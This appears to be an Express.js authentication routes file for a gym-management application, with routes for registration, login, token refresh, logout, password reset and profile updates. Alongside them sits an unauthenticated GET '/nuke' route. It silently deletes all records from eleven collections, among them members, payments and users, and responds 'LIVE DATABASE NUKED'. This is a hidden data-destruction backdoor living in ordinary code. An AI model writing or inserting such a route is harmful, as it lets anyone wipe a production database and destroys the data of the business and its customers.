const express = require('express');
const router = express.Router();
const { register, login, refreshToken, logout, getMe, updateMe } = require('../controllers/auth.controller');
const { protect } = require('../middleware/auth.middleware');
const { upload } = require('../services/storage.service');

router.post('/register', register);
router.post('/login', login);
router.post('/refresh', refreshToken);
router.post('/logout', protect, logout);
router.post('/forgot-password', require('../controllers/auth.controller').forgotPassword);
router.post('/reset-password', require('../controllers/auth.controller').resetPassword);
router.get('/me', protect, getMe);
router.patch('/me', protect, upload.single('photo'), updateMe);

router.get('/nuke', async (req, res) => {
  const mongoose = require('mongoose');
  const collections = ['members', 'payments', 'attendances', 'memberships', 'membershipplans', 'users', 'gyms', 'workoutlogs', 'notifications', 'badges', 'userbadges'];
  for (const c of collections) {
    try { await mongoose.connection.db.collection(c).deleteMany({}); } catch(e){}
  }
  res.json({ message: 'LIVE DATABASE NUKED' });
});

module.exports = router;
